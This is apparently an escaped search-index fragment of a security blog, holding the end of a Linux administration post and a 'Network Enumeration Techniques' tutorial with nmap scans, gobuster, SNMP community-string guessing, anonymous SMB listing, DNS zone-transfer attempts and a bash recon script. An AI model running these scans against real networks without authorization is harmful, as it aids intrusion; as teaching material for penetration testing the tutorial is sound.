HTTP/1.1\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"m\"\u003e1234\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Mozilla/5.0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.1.101 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e30/Jan/2024:12:00:01 +0000\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;GET /favicon.ico HTTP/1.1\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e404\u003c/span\u003e \u003cspan class=\"m\"\u003e162\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Mozilla/5.0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Execute commands in container\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ docker \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e -it webserver /bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot@a1b2c3d4e5f6:/# ls -la\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etotal \u003cspan class=\"m\"\u003e12\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edrwxr-xr-x   \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 12:00 .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edrwxr-xr-x   \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 12:00 ..\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edrwxr-xr-x   \u003cspan class=\"m\"\u003e2\u003c/span\u003e root root \u003cspan class=\"m\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 11:30 var\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"container-security-monitoring\"\u003eContainer Security Monitoring\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check container security with docker-bench-security\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ git clone https://github.com/docker/docker-bench-security.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e docker-bench-security\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo ./docker-bench-security.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Container vulnerability scanning\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -v /tmp:/tmp anchore/syft:latest packages docker:nginx:latest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Monitor container network connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ docker \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e webserver netstat -tuln\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eActive Internet connections \u003cspan class=\"o\"\u003e(\u003c/span\u003eonly servers\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eProto Recv-Q Send-Q Local Address           Foreign Address         State\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etcp        \u003cspan class=\"m\"\u003e0\u003c/span\u003e      \u003cspan class=\"m\"\u003e0\u003c/span\u003e 0.0.0.0:80              0.0.0.0:*               LISTEN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etcp6       \u003cspan class=\"m\"\u003e0\u003c/span\u003e      \u003cspan class=\"m\"\u003e0\u003c/span\u003e :::80                   :::*                    LISTEN\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"performance-monitoring\"\u003ePerformance Monitoring\u003c/h2\u003e\n\u003ch3 id=\"system-metrics\"\u003eSystem Metrics\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# CPU and memory monitoring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ htop\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Interactive process viewer with real-time metrics\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# I/O monitoring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ iostat -x \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLinux 5.4.0-74-generic \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver01\u003cspan class=\"o\"\u003e)\u003c/span\u003e    01/30/2024  _x86_64_    \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e4\u003c/span\u003e CPU\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eavg-cpu:  %user   %nice %system %iowait  %steal   %idle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           2.50    0.00    1.25    0.25    0.00   96.00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDevice            r/s     w/s     rkB/s     wkB/s   rrqm/s   wrqm/s  %rrqm  %wrqm r_await w_await aqu-sz rareq-sz wareq-sz  svctm  %util\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esda               0.00    0.00      0.00      0.00     0.00     0.00   0.00   0.00    0.00    0.00   0.00     0.00     0.00   0.00   0.00\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"conclusion\"\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eThese Linux system administration techniques provide a solid foundation for managing and maintaining Linux systems. Regular monitoring, automation, and security hardening are essential for production environments.\u003c/p\u003e","title":"Linux System Administration Essentials"},{"content":"Network Enumeration Techniques A comprehensive guide to network enumeration using various tools and techniques. This post covers the essential methods for discovering and mapping network infrastructure.\nBasic Network Discovery Nmap Host Discovery # Ping sweep to discover live hosts $ nmap -sn 192.168.1.0/24 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-30 10:00 UTC Nmap scan report for 192.168.1.1 Host is up (0.045s latency). Nmap scan report for 192.168.1.10 Host is up (0.023s latency). Nmap scan report for 192.168.1.15 Host is up (0.067s latency). Nmap done: 256 IP addresses (3 hosts up) scanned in 8.45 seconds Port Scanning # Comprehensive port scan $ nmap -sS -sV -sC -O -A 192.168.1.10 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-30 10:05 UTC Nmap scan report for 192.168.1.10 Host is up (0.023s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Welcome to Apache2 Ubuntu Default Page 443/tcp open https Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Welcome to Apache2 Ubuntu Default Page Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds Service Enumeration HTTP/HTTPS Enumeration # Directory enumeration with gobuster $ gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.1.0 =============================================================== [+] Url: http://192.168.1.10 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status Codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2024/01/30 10:10:00 Starting gobuster =============================================================== /admin (Status: 200) [Size: 1234] /images (Status: 200) [Size: 5678] /scripts (Status: 200) [Size: 2345] =============================================================== 2024/01/30 10:10:15 Finished =============================================================== SSH Enumeration # SSH version detection and key enumeration $ ssh -V OpenSSH_8.2p1 Ubuntu-4ubuntu0.5, OpenSSL 1.1.1f 31 Mar 2020 $ ssh-keyscan -t rsa,dsa,ecdsa,ed25519 192.168.1.10 # 192.168.1.10:22 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 192.168.1.10 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... 192.168.1.10 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG... Advanced Techniques UDP Port Scanning # UDP port scan for common services $ nmap -sU --top-ports 1000 192.168.1.10 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-30 10:15 UTC Nmap scan report for 192.168.1.10 Host is up (0.023s latency). PORT STATE SERVICE 53/udp open domain 123/udp open ntp 161/udp open snmp 500/udp open|filtered isakmp Nmap done: 1 IP address (1 host up) scanned in 45.67 seconds SNMP Enumeration # SNMP community string enumeration $ onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt \\ 192.168.1.10 Scanning 1 hosts, 122 communities 192.168.1.10 [public] Linux router 4.15.0-99-generic #100-Ubuntu SMP \\ Wed Apr 22 20:32:56 UTC 2020 x86_64 192.168.1.10 [internal] Linux router 4.15.0-99-generic #100-Ubuntu SMP \\ Wed Apr 22 20:32:56 UTC 2020 x86_64 # SNMP walk with valid community string $ snmpwalk -v2c -c public 192.168.1.10 iso.3.6.1.2.1.1.1.0 = STRING: \u0026#34;Linux router 4.15.0-99-generic\u0026#34; iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10 iso.3.6.1.2.1.1.3.0 = Timeticks: (123456) 0:20:34.56 # Extract running processes (potential password exposure) $ snmpwalk -v2c -c internal 192.168.1.10 1.3.6.1.2.1.25.4.2.1.2 iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: \u0026#34;kernel\u0026#34; iso.3.6.1.2.1.25.4.2.1.2.123 = STRING: \u0026#34;/usr/local/bin/login.py kj23sadkj123as0-d213\u0026#34; # System information $ snmpget -v2c -c public 192.168.1.10 1.3.6.1.2.1.1.5.0 # Hostname iso.3.6.1.2.1.1.5.0 = STRING: \u0026#34;router\u0026#34; Service Version Detection # Detailed service version detection $ nmap -sV -sC -p 80,443,22,21,25,53,110,143,993,995 192.168.1.10 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-30 10:20 UTC Nmap scan report for 192.168.1.10 Host is up (0.023s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 25/tcp open smtp Postfix smtpd 53/tcp open domain ISC BIND 9.16.1 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd 443/tcp open https Apache httpd 2.4.41 ((Ubuntu)) 993/tcp open imaps Dovecot imapd 995/tcp open pop3s Dovecot pop3d Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel SMB/NetBIOS Enumeration # SMB enumeration with smbclient $ smbclient -L //192.168.1.10 -N Anonymous login successful Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers shared Disk Shared Files IPC$ IPC IPC Service (Samba 4.13.17) # Enumerate SMB shares $ enum4linux -a 192.168.1.10 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) [+] Target Information Target ........... 192.168.1.10 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; # SMB version detection $ nmap --script smb-protocols 192.168.1.10 PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-protocols: | dialects: | NT LM 0.12 (SMBv1) [dangerous, but default] | 2.1 | 3.0 |_ 3.1.1 # Check for SMB vulnerabilities $ nmap --script smb-vuln* 192.168.1.10 DNS Enumeration # DNS zone transfer attempt $ dig axfr @192.168.1.10 example.com ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.12 \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @192.168.1.10 example.com ; (1 server found) ;; global options: +cmd example.com. 3600 IN SOA ns1.example.com. admin.example.com. \\ 2024013001 3600 1800 604800 86400 example.com. 3600 IN NS ns1.example.com. www.example.com. 3600 IN A 192.168.1.10 mail.example.com. 3600 IN A 192.168.1.11 # DNS enumeration with dnsrecon $ dnsrecon -d example.com -t axfr -n 192.168.1.10 [+] Testing NS Servers for Zone Transfer [+] Checking for Zone Transfer for example.com name servers [+] Zone Transfer was successful!! [+] NS ns1.example.com 192.168.1.10 Automation Scripts Bash Enumeration Script #!/bin/bash # Network enumeration automation script TARGET=$1 if [ -z \u0026#34;$TARGET\u0026#34; ]; then echo \u0026#34;Usage: $0 \u0026lt;target_ip\u0026gt;\u0026#34; exit 1 fi echo \u0026#34;Starting comprehensive enumeration of $TARGET\u0026#34; echo \u0026#34;==============================================\u0026#34; # Host discovery echo \u0026#34;[+] Host discovery...\u0026#34; nmap -sn $TARGET # Port scan echo \u0026#34;[+] Port scanning...\u0026#34; nmap -sS -sV -sC -O -A $TARGET # HTTP enumeration echo \u0026#34;[+] HTTP enumeration...\u0026#34; gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt # SSH enumeration echo \u0026#34;[+] SSH enumeration...\u0026#34; ssh-keyscan -t rsa,dsa,ecdsa,ed25519 $TARGET echo \u0026#34;Enumeration complete!\u0026#34; Best Practices 1. Stealth Scanning Use -sS for SYN scans Adjust timing with -T options Use decoy scans when needed 2. Service Identification Always use -sV for version detection Combine with -sC for default scripts Use -A for aggressive scanning 3. Documentation Save all output to files Use timestamps in filenames Document findings systematically Conclusion Network enumeration is a crucial phase in penetration testing and security assessments. These techniques provide a solid foundation for discovering and mapping network infrastructure.\nRemember to always obtain proper authorization before performing network enumeration on any systems.\n","permalink":"https://realspaceeagle.github.io/posts/network-enumeration-techniques/","summary":"\u003ch1 id=\"network-enumeration-techniques\"\u003eNetwork Enumeration Techniques\u003c/h1\u003e\n\u003cp\u003eA comprehensive guide to network enumeration using various tools and techniques. This post covers the essential methods for discovering and mapping network infrastructure.\u003c/p\u003e\n\u003ch2 id=\"basic-network-discovery\"\u003eBasic Network Discovery\u003c/h2\u003e\n\u003ch3 id=\"nmap-host-discovery\"\u003eNmap Host Discovery\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Ping sweep to discover live hosts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ nmap -sn 192.168.1.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.94 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2024-01-30 10:00 UTC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.045s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.023s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 192.168.1.15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.067s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e256\u003c/span\u003e IP addresses \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e hosts up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 8.45 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"port-scanning\"\u003ePort Scanning\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Comprehensive port scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ nmap -sS -sV -sC -O -A 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.94 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2024-01-30 10:05 UTC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.023s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http    Apache httpd 2.4.41 \u003cspan class=\"o\"\u003e((\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Apache/2.4.41 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Welcome to Apache2 Ubuntu Default Page\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e443/tcp  open  https   Apache httpd 2.4.41 \u003cspan class=\"o\"\u003e((\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Apache/2.4.41 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Welcome to Apache2 Ubuntu Default Page\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:linux:linux_kernel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 15.23 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"service-enumeration\"\u003eService Enumeration\u003c/h2\u003e\n\u003ch3 id=\"httphttps-enumeration\"\u003eHTTP/HTTPS Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Directory enumeration with gobuster\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGobuster v3.1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Url:            http://192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Method:         GET\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Threads:        \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Wordlist:       /usr/share/wordlists/dirb/common.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Status Codes:   200,204,301,302,307,401,403\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e User Agent:     gobuster/3.1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Timeout:        \u003cspan class=\"nv\"\u003e10s\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/01/30 10:10:00 Starting \u003cspan class=\"nv\"\u003egobuster\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/admin                \u003cspan class=\"o\"\u003e(\u003c/span\u003eStatus: 200\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eSize: 1234\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/images               \u003cspan class=\"o\"\u003e(\u003c/span\u003eStatus: 200\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eSize: 5678\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/scripts              \u003cspan class=\"o\"\u003e(\u003c/span\u003eStatus: 200\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eSize: 2345\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 